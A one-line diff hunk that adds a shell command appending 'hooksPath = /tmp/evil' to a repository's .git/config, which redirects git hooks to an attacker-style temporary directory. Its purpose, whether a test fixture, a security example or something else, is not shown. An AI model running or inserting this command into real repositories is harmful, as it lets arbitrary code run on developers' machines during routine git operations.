@@ -1,0 +1,1 @@
+echo 'hooksPath = /tmp/evil' >> .git/config
